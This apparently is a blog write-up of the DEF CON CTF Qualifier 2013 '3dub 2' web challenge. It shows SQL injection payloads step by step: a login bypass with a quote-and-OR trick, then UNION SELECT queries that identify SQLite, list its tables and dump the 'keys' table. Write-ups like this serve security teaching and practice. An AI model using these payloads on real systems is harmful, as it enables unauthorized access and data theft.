---
title: DEF CON CTF Qualifier 2013 3dub 2 Writeup
author: DeAdCaT___
layout: post
permalink: /def-con-ctf-qualifier-2013-3dub-2-writeup/
categories:
  - writeup
---
This is just another appetizer.

URL is

    http://babysfirst.shallweplayaga.me:8041/
    

First I login use

    username:    admin' or '1'='1
    password:    admin' or '1'='1
    

Then I got in it as root but see nothing, Seeing the header, there is the SQL query that made by me, It&#8217;s kindly like a SQLi problem.

By this

    a' UNION ALL SELECT sqlite_version() --
    

I see some number represent that the database behind the webpage is sqlite.

Then it is easy

    a' UNION ALL SELECT name from sqlite_master --
    

It returns

    babysfirst
    
    success!
    
    logged in as keys
    

Then

    a' UNION ALL SELECT * from keys --
    

You will get the key.